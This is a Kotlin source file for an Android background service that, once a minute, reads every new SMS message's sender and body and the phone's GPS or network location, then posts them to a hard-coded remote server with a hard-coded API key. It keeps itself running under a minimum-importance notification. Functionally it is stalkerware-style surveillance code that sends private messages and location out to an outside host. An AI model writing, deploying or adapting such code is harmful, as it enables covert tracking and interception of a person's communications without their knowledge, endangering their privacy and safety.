package com.venice.tracker

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.provider.Telephony
import org.json.JSONObject
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL
import java.util.concurrent.Executors

class TrackerService : Service() {

    companion object {
        const val SERVER = "https://phone-tracker-21ic.onrender.com"
        const val API_KEY = "moj-tajni-kljuc-123"
        const val CHANNEL_ID = "tracker_channel"
        const val NOTIF_ID = 1
        const val INTERVAL_MS = 60000L
    }

    private val handler = Handler(Looper.getMainLooper())
    private val executor = Executors.newSingleThreadExecutor()
    private var lastSmsTs = 0L
    private var lastLoc: Location? = null

    private val locListener = object : LocationListener {
        override fun onLocationChanged(location: Location) { lastLoc = location }
        override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {}
        override fun onProviderEnabled(provider: String) {}
        override fun onProviderDisabled(provider: String) {}
    }

    private val tick = object : Runnable {
        override fun run() {
            executor.execute { sendNewSms(); sendLocation() }
            handler.postDelayed(this, INTERVAL_MS)
        }
    }

    override fun onCreate() {
        super.onCreate()
        createChannel()
        try { startForeground(NOTIF_ID, buildNotification()) } catch (e: Exception) { e.printStackTrace() }
        lastSmsTs = System.currentTimeMillis()
        startLocationUpdates()
        handler.post(tick)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int = START_STICKY

    override fun onDestroy() {
        handler.removeCallbacks(tick)
        try {
            val lm = getSystemService(Context.LOCATION_SERVICE) as LocationManager
            lm.removeUpdates(locListener)
        } catch (e: Exception) { e.printStackTrace() }
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun createChannel() {
        if (Build.VERSION.SDK_INT >= 26) {
            val mgr = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            mgr.createNotificationChannel(
                NotificationChannel(CHANNEL_ID, "Tracker", NotificationManager.IMPORTANCE_MIN)
            )
        }
    }

    private fun buildNotification(): Notification {
        val b = if (Build.VERSION.SDK_INT >= 26) Notification.Builder(this, CHANNEL_ID)
        else Notification.Builder(this)
        return b.setContentTitle("Tracker radi")
            .setContentText("Pracenje aktivno")
            .setSmallIcon(android.R.drawable.ic_menu_mylocation)
            .build()
    }

    private fun startLocationUpdates() {
        try {
            val lm = getSystemService(Context.LOCATION_SERVICE) as LocationManager
            lm.requestLocationUpdates(LocationManager.GPS_PROVIDER, 60000L, 0f, locListener)
            lm.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 60000L, 0f, locListener)
        } catch (e: Exception) { e.printStackTrace() }
    }

    private fun sendNewSms() {
        try {
            val cursor = contentResolver.query(Telephony.Sms.CONTENT_URI, null, null, null, "date ASC") ?: return
            cursor.use {
                val iDate = it.getColumnIndex("date")
                val iAddr = it.getColumnIndex("address")
                val iBody = it.getColumnIndex("body")
                while (it.moveToNext()) {
                    val date = it.getLong(iDate)
                    if (date > lastSmsTs) {
                        val o = JSONObject()
                        o.put("from", it.getString(iAddr) ?: "?")
                        o.put("body", it.getString(iBody) ?: "")
                        o.put("date", date)
                        post("/api/sms", o.toString())
                        lastSmsTs = date
                    }
                }
            }
        } catch (e: Exception) { e.printStackTrace() }
    }

    private fun sendLocation() {
        try {
            val lm = getSystemService(Context.LOCATION_SERVICE) as LocationManager
            val loc = lastLoc
                ?: lm.getLastKnownLocation(LocationManager.GPS_PROVIDER)
                ?: lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
            if (loc != null) {
                val o = JSONObject()
                o.put("lat", loc.latitude)
                o.put("lng", loc.longitude)
                post("/api/location", o.toString())
            }
        } catch (e: Exception) { e.printStackTrace() }
    }

    private fun post(path: String, json: String) {
        try {
            val conn = URL(SERVER + path).openConnection() as HttpURLConnection
            conn.requestMethod = "POST"
            conn.setRequestProperty("Content-Type", "application/json")
            conn.setRequestProperty("x-api-key", API_KEY)
            conn.doOutput = true
            conn.connectTimeout = 15000
            conn.readTimeout = 15000
            OutputStreamWriter(conn.outputStream).use { it.write(json) }
            conn.responseCode
            conn.disconnect()
        } catch (e: Exception) { e.printStackTrace() }
    }
}
